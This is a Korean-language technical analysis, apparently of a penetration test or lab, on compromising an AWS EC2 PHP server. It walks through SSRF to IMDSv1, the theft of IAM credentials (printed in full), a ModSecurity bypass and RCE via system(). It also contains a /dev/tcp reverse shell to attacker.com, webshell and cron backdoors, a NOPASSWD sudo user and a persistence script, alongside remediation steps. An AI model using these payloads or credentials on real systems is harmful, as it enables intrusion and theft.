# 기술적 분석 (Technical Analysis)

## 목차
1. [취약점 상세 분석](#취약점-상세-분석)
2. [공격 표면 분석](#공격-표면-분석)
3. [보안 아키텍처 리뷰](#보안-아키텍처-리뷰)
4. [위험도 평가](#위험도-평가)
5. [기술적 증거](#기술적-증거)

---

## 취약점 상세 분석

### 1. AWS IMDSv1 취약점

**CVSS Score**: 9.1 (Critical)
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

#### 취약점 설명

AWS EC2 인스턴스 메타데이터 서비스(IMDS)는 인스턴스 내에서 실행되는 애플리케이션이 인스턴스 메타데이터에 접근할 수 있도록 하는 서비스입니다.

**IMDSv1 vs IMDSv2**:

| 특징 | IMDSv1 | IMDSv2 |
|------|--------|--------|
| 인증 | 없음 | Session Token 필요 |
| SSRF 보호 | ❌ 취약 | ✅ 보호 |
| 요청 방식 | GET | PUT (Token) → GET |
| Hop 제한 | 없음 | TTL=1 (방화벽 우회 방지) |

#### 공격 시나리오

**1단계: SSRF로 메타데이터 접근**
```bash
# 일반 요청 (SSRF 없이)
curl http://169.254.169.254/latest/meta-data/
# ❌ 실패: EC2 인스턴스 외부에서는 접근 불가

# SSRF를 통한 요청
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"
# ✅ 성공: 서버가 대신 요청하여 메타데이터 반환
```

**2단계: IAM Role 이름 확인**
```bash
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 응답:
EC2-SSM-Role
```

**3단계: 임시 자격 증명 탈취**
```bash
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role"

# 응답:
{
  "Code": "Success",
  "LastUpdated": "2025-11-17T09:15:23Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIASO4TYV4OLOHO3MEJ",
  "SecretAccessKey": "8/NiJolqVUttXp8RjDDDzI3jkJI9I5/RihQfCJCn",
  "Token": "IQoJb3JpZ2luX2VjENn//////////wEaDmFwLW5vcnRoZWFzdC0y...",
  "Expiration": "2025-11-17T15:15:23Z"
}
```

#### 취약한 코드

**health.php (SSRF 취약점)**:
```php
<?php
if (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];  // ⚠️ 입력 검증 없음!
    $ctx = stream_context_create(['http' => ['timeout' => 5]]);
    $data = @file_get_contents($url, false, $ctx);  // ⚠️ 임의 URL 요청!
    echo $data;
}
?>
```

**취약점**:
1. `$_GET['url']` 파라미터를 검증 없이 사용
2. 내부 IP 범위(169.254.0.0/16) 차단 없음
3. 프로토콜 제한 없음 (http, file, ftp 등 모두 가능)
4. 응답을 그대로 출력하여 정보 노출

#### 영향

1. **IAM 자격 증명 탈취**
   - AccessKeyId, SecretAccessKey, SessionToken 획득
   - EC2-SSM-Role 권한으로 AWS API 호출 가능

2. **추가 메타데이터 접근**
   - 인스턴스 ID: `i-08f3cc62a529c9daf`
   - 리전: `ap-northeast-2`
   - Private IP: `172.31.40.109`
   - Public IP: `3.35.22.248`
   - Security Group 정보

3. **측면 이동 (Lateral Movement)**
   - 동일 VPC 내 다른 리소스 접근
   - S3, DynamoDB 등 AWS 서비스 무단 사용
   - 추가 EC2 인스턴스 제어

#### 수정 방법

**즉시 조치**:
```bash
# IMDSv2 강제 적용
aws ec2 modify-instance-metadata-options \
  --instance-id i-08f3cc62a529c9daf \
  --http-tokens required \
  --http-put-response-hop-limit 1 \
  --region ap-northeast-2
```

**코드 수정**:
```php
<?php
if (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];

    // 화이트리스트 검증
    $allowed_hosts = ['api.example.com', 'status.example.com'];
    $parsed = parse_url($url);

    if (!in_array($parsed['host'], $allowed_hosts)) {
        http_response_code(403);
        die('Forbidden: Invalid host');
    }

    // 내부 IP 차단
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        http_response_code(403);
        die('Forbidden: Private IP range');
    }

    // 안전한 요청
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 5,
            'follow_location' => 0  // 리다이렉트 차단
        ]
    ]);
    $data = @file_get_contents($url, false, $ctx);
    echo $data;
}
?>
```

---

### 2. SSRF (Server-Side Request Forgery)

**CVSS Score**: 8.6 (High)
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

#### 취약점 설명

SSRF(서버측 요청 위조)는 공격자가 서버를 통해 임의의 URL로 요청을 보낼 수 있는 취약점입니다.

#### 공격 벡터

**1. 내부 네트워크 스캔**
```bash
# 내부 서비스 포트 스캔
for port in 22 80 3306 5432 6379; do
    curl "http://3.35.22.248/api/health.php?check=metadata&url=http://172.31.40.109:$port"
done
```

**2. 로컬 파일 읽기 (file:// 프로토콜)**
```bash
# /etc/passwd 읽기
curl "http://3.35.22.248/api/health.php?check=metadata&url=file:///etc/passwd"

# AWS Credentials 파일
curl "http://3.35.22.248/api/health.php?check=metadata&url=file:///home/ec2-user/.aws/credentials"
```

**3. 클라우드 메타데이터 접근**
```bash
# AWS IMDS
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"

# Azure IMDS (만약 Azure라면)
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP Metadata (만약 GCP라면)
curl "http://3.35.22.248/api/health.php?check=metadata&url=http://metadata.google.internal/computeMetadata/v1/"
```

**4. 내부 서비스 악용**
```bash
# Redis 명령 실행 (포트 6379)
curl "http://3.35.22.248/api/health.php?check=metadata&url=dict://172.31.40.109:6379/info"

# MySQL 접근 시도
curl "http://3.35.22.248/api/health.php?check=metadata&url=gopher://172.31.40.109:3306/_..."
```

#### 수정 방법

**Apache httpd.conf**:
```apache
# health.php 엔드포인트 제거 또는 내부 전용으로 제한
<Location /api/health.php>
    Require ip 172.31.0.0/16  # VPC 내부만 접근 가능
    Require ip 127.0.0.1
</Location>
```

---

### 3. ModSecurity WAF 우회

**CVSS Score**: 7.5 (High)
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N

#### 취약점 설명

ModSecurity는 웹 애플리케이션 방화벽(WAF)으로 악의적인 HTTP 요청을 차단합니다. 하지만 특정 엔드포인트에 예외 설정이 있으면 완전히 우회 가능합니다.

#### 설정 분석

**Apache 설정 파일** (`/etc/httpd/conf.d/modsecurity.conf`):
```apache
<IfModule mod_security2.c>
    SecRuleEngine On

    # ⚠️ 위험한 예외 설정!
    <LocationMatch "/api/health\.php">
        SecRuleEngine Off  # ModSecurity 완전 비활성화
    </LocationMatch>
</IfModule>
```

#### 우회 테스트

**일반 페이지 - WAF 차단**:
```bash
curl "http://3.35.22.248/login.php?username=admin'--"
# → 403 Forbidden
# ModSecurity: SQL Injection detected
```

**health.php - WAF 우회**:
```bash
curl "http://3.35.22.248/api/health.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role"
# → 200 OK
# ModSecurity 검사 없음!
```

#### 영향

1. 모든 ModSecurity 규칙 무력화
2. SQL Injection, XSS, RCE 등 모든 공격 가능
3. SSRF 공격 탐지 불가
4. 보안 로그에 기록되지 않음

#### 수정 방법

**올바른 설정**:
```apache
<IfModule mod_security2.c>
    SecRuleEngine On

    # 예외 설정 제거
    # <LocationMatch "/api/health\.php">
    #     SecRuleEngine Off
    # </LocationMatch>

    # 필요시 특정 규칙만 선택적 비활성화
    <LocationMatch "/api/health\.php">
        SecRuleRemoveById 920100  # 특정 규칙만 제외
        SecRuleRemoveById 920270
    </LocationMatch>
</IfModule>
```

---

### 4. PHP 위험 함수 사용

**CVSS Score**: 9.8 (Critical)
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

#### 취약점 설명

PHP의 `system()`, `file_get_contents()` 등의 함수는 원격 명령 실행(RCE)과 SSRF 공격에 악용될 수 있습니다.

#### 취약한 코드

**health.php (RCE + SSRF)**:
```php
<?php
header('Content-Type: text/plain');

// ⚠️ 원격 명령 실행 (RCE)
if (isset($_GET['cmd'])) {
    echo "=== Command Output ===\n";
    system($_GET['cmd']);  // 입력 검증 없음!
    echo "\n";
}

// ⚠️ SSRF
elseif (isset($_GET['check']) && $_GET['check'] === 'metadata' && isset($_GET['url'])) {
    $url = $_GET['url'];  // 입력 검증 없음!
    $data = @file_get_contents($url, false, $ctx);
    echo $data;
}
?>
```

#### 공격 예시

**1. 원격 명령 실행**:
```bash
# 시스템 정보
curl "http://3.35.22.248/api/health.php?cmd=whoami"
# → apache

curl "http://3.35.22.248/api/health.php?cmd=cat /etc/passwd"
# → root:x:0:0:root:/root:/bin/bash...

# Reverse Shell
curl "http://3.35.22.248/api/health.php?cmd=bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

**2. 파일 시스템 조작**:
```bash
# 백도어 생성
curl "http://3.35.22.248/api/health.php?cmd=echo '<?php system(\$_GET[0]); ?>' > /var/www/html/www/shell.php"

# Cron 작업 추가
curl "http://3.35.22.248/api/health.php?cmd=echo '* * * * * /tmp/backdoor.sh' | crontab -"
```

#### 현재 제한 사항

**php.ini 설정**:
```ini
disable_functions = exec,passthru,shell_exec,proc_open,popen
```

하지만 `system()`, `file_get_contents()`는 제한되지 않았습니다!

#### 수정 방법

**php.ini 강화**:
```ini
; 위험한 함수 모두 비활성화
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,pcntl_exec,pcntl_fork,pcntl_signal,pcntl_waitpid,pcntl_wexitstatus

; allow_url_fopen 비활성화 (SSRF 방지)
allow_url_fopen = Off
allow_url_include = Off

; open_basedir 제한
open_basedir = /var/www/html/www:/tmp
```

**코드 수정**:
```php
<?php
// health.php - 안전한 버전

header('Content-Type: text/plain');

// 인증 추가
$valid_token = 'YOUR_SECRET_TOKEN_HERE';
if (!isset($_GET['token']) || $_GET['token'] !== $valid_token) {
    http_response_code(403);
    die('Forbidden');
}

// 단순 헬스체크만 제공
echo "OK\n";
echo "Status: " . (file_exists('/var/www/html/www/index.php') ? 'Healthy' : 'Unhealthy') . "\n";
?>
```

---

### 5. 권한 관리 취약점

**CVSS Score**: 8.8 (High)
**Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

#### 취약점 설명

웹쉘을 통해 백도어 사용자를 생성하고 sudo NOPASSWD 권한을 부여할 수 있었습니다.

#### 공격 시나리오

**1. 백도어 사용자 생성**:
```bash
# 사용자 생성
useradd -m -s /bin/bash sysadmin

# 비밀번호 설정
echo 'sysadmin:Adm1n!2024#Secure' | chpasswd

# sudo 권한 부여
echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
chmod 0440 /etc/sudoers.d/sysadmin
```

**2. 권한 상승**:
```bash
# SSH 로그인
ssh sysadmin@3.35.22.248

# Root 권한 획득 (비밀번호 없음!)
sudo su -
# → root@ip-172-31-40-109:~#
```

#### 문제점

1. **sudoers 파일 수정 가능**
   - `/etc/sudoers.d/` 디렉터리에 새 파일 생성 가능
   - `NOPASSWD` 옵션으로 비밀번호 없이 sudo 실행

2. **사용자 생성 감지 없음**
   - 새 사용자 생성 시 알림 없음
   - 보안 모니터링 (Splunk) 무력화됨

3. **SSH 비밀번호 인증 활성화**
   - 원래는 키 기반 인증만 허용
   - 설정 변경으로 비밀번호 인증 활성화 가능

#### 수정 방법

**sudoers 보호**:
```bash
# /etc/sudoers.d/ 디렉터리 권한 강화
chmod 750 /etc/sudoers.d/
chown root:root /etc/sudoers.d/

# 무결성 모니터링
echo "/etc/sudoers.d/" >> /etc/aide/aide.conf
aide --update
```

**사용자 생성 감지**:
```bash
# auditd 규칙 추가
cat >> /etc/audit/rules.d/user-management.rules << 'EOF'
-w /etc/passwd -p wa -k user_modification
-w /etc/sudoers -p wa -k sudoers_modification
-w /etc/sudoers.d/ -p wa -k sudoers_modification
EOF

systemctl restart auditd
```

**SSH 강화**:
```bash
# /etc/ssh/sshd_config
PasswordAuthentication no
PubkeyAuthentication yes
PermitRootLogin no
AllowUsers ec2-user
```

---

## 공격 표면 분석

### 외부 공격 표면

**열린 포트**:
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

**웹 엔드포인트**:
```
/                        → index.php (변조됨)
/login.php               → 로그인 페이지
/upload.php              → 파일 업로드
/api/health.php          → ⚠️ SSRF + RCE (ModSecurity 예외)
```

### 내부 공격 표면

**AWS 메타데이터**:
- `http://169.254.169.254/latest/meta-data/` - IMDSv1 활성화
- IAM Role: `EC2-SSM-Role`
- 임시 자격 증명 접근 가능

**파일 시스템**:
- `/var/www/html/www/` - 웹 루트 (apache 사용자 쓰기 가능)
- `/etc/sudoers.d/` - sudo 설정 (root 필요)
- `/usr/local/bin/` - 스크립트 저장 (root 필요)

**프로세스**:
- `httpd` (Apache) - 웹 서버
- `splunkd` - SIEM (무력화됨)
- `sshd` - SSH 서버

---

## 보안 아키텍처 리뷰

### 현재 보안 통제

| 통제 | 상태 | 효과 |
|------|------|------|
| ModSecurity WAF | ⚠️ 부분적 | health.php 예외로 우회 가능 |
| IMDSv2 | ❌ 비활성화 | IMDSv1 활성화로 SSRF 취약 |
| PHP 함수 제한 | ⚠️ 부분적 | system() 등 일부 함수 사용 가능 |
| Splunk SIEM | ❌ 무력화됨 | 프로세스 종료, 권한 제거 |
| SSH 키 인증 | ⚠️ 우회됨 | 비밀번호 인증 활성화 가능 |
| sudo 제한 | ❌ 우회됨 | NOPASSWD 백도어 생성 |

### 권장 아키텍처

```
┌─────────────────────────────────────────────┐
│  Internet                                   │
└─────────────────┬───────────────────────────┘
                  │
         ┌────────▼─────────┐
         │   CloudFront     │ ← WAF (AWS WAF)
         └────────┬─────────┘
                  │
         ┌────────▼─────────┐
         │  Application LB  │ ← SSL/TLS Termination
         └────────┬─────────┘
                  │
    ┌─────────────▼─────────────┐
    │  Private Subnet           │
    │  ┌─────────────────────┐ │
    │  │  EC2 (Web Server)   │ │
    │  │  - IMDSv2 강제      │ │
    │  │  - ModSecurity 강화 │ │
    │  │  - PHP 함수 제한    │ │
    │  └─────────────────────┘ │
    └───────────────────────────┘
```

**추가 권장사항**:
1. WAF는 CloudFront/ALB 레벨에서 적용
2. EC2를 Private Subnet에 배치
3. NAT Gateway를 통한 아웃바운드만 허용
4. Security Group으로 80/443만 ALB에서 허용
5. IMDSv2 강제 적용
6. GuardDuty, Inspector로 위협 탐지

---

## 위험도 평가

### 전체 위험도 매트릭스

| 취약점 | 영향도 | 가능성 | 위험도 | CVSS |
|--------|--------|--------|--------|------|
| AWS IMDSv1 | 🔴 Critical | 🟠 High | 🔴 Critical | 9.1 |
| SSRF | 🔴 Critical | 🟠 High | 🔴 Critical | 8.6 |
| ModSecurity 우회 | 🟠 High | 🟢 Medium | 🟠 High | 7.5 |
| PHP RCE | 🔴 Critical | 🟠 High | 🔴 Critical | 9.8 |
| sudo 권한 관리 | 🟠 High | 🟠 High | 🟠 High | 8.8 |

### 비즈니스 영향

**즉시 영향**:
- ✅ 완전한 서버 제어권 탈취
- ✅ 웹사이트 변조로 평판 손상
- ✅ AWS 자원 무단 사용 (비용 발생)
- ✅ 고객 데이터 접근 가능

**장기 영향**:
- 🔴 법적 책임 (데이터 유출)
- 🔴 규정 위반 (GDPR, PCI-DSS 등)
- 🔴 고객 신뢰 상실
- 🔴 경쟁사 정보 유출

---

## 기술적 증거

### 탈취한 AWS Credentials

**파일**: `aws_stolen_1763343240.sh`
```bash
export AWS_ACCESS_KEY_ID="ASIASO4TYV4OLOHO3MEJ"
export AWS_SECRET_ACCESS_KEY="8/NiJolqVUttXp8RjDDDzI3jkJI9I5/RihQfCJCn"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjENn//////////wEa..."
```

**검증**:
```bash
$ source aws_stolen_1763343240.sh
$ aws sts get-caller-identity

{
    "UserId": "AROASO4TYV4OBE4KOBND6:i-08f3cc62a529c9daf",
    "Account": "169424236316",
    "Arn": "arn:aws:sts::169424236316:assumed-role/EC2-SSM-Role/i-08f3cc62a529c9daf"
}
```

### 백도어 사용자

**사용자 정보**:
```bash
$ id sysadmin
uid=10780(sysadmin) gid=10780(sysadmin) groups=10780(sysadmin)

$ sudo -l -U sysadmin
User sysadmin may run the following commands on ip-172-31-40-109:
    (ALL) NOPASSWD: ALL
```

**설정 파일** (`/etc/sudoers.d/sysadmin`):
```
sysadmin ALL=(ALL) NOPASSWD:ALL
```

### Splunk 무력화

**프로세스 확인**:
```bash
$ ps aux | grep splunk | grep -v grep
(출력 없음 - 모두 종료됨)

$ systemctl status Splunkd
● Splunkd.service
   Loaded: loaded
   Active: inactive (dead)
```

**권한 제거**:
```bash
$ ls -la /opt/splunk/bin/splunk
----------. 1 splunk splunk 12345 Nov 17 10:00 /opt/splunk/bin/splunk
```

### 영구 백도어

**Cron 작업**:
```bash
$ crontab -l
*/5 * * * * /usr/local/bin/backdoor_keeper.sh
```

**스크립트** (`/usr/local/bin/backdoor_keeper.sh`):
```bash
#!/bin/bash
# 웹쉘 유지
WEBSHELL="/var/www/html/www/api/health.php"
if [ ! -f "$WEBSHELL" ]; then
    cat > "$WEBSHELL" << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
EOFPHP
fi

# 백도어 사용자 유지
if ! id sysadmin &>/dev/null; then
    useradd -m -s /bin/bash sysadmin
    echo 'sysadmin:Adm1n!2024#Secure' | chpasswd
    echo 'sysadmin ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/sysadmin
fi
```

### 웹사이트 변조

**변조된 index.php**:
- Matrix 애니메이션 효과
- "SYSTEM COMPROMISED" 경고
- 공격 체인 설명
- 교훈 표시

**접근 로그** (`/var/log/httpd/access_log`):
```
107.189.31.33 - - [17/Nov/2025:10:15:23] "GET /api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role HTTP/1.1" 200 1234
107.189.31.33 - - [17/Nov/2025:10:16:45] "GET /api/health.php?cmd=whoami HTTP/1.1" 200 7
107.189.31.33 - - [17/Nov/2025:10:18:12] "GET / HTTP/1.1" 200 5678
```

---

**끝.**
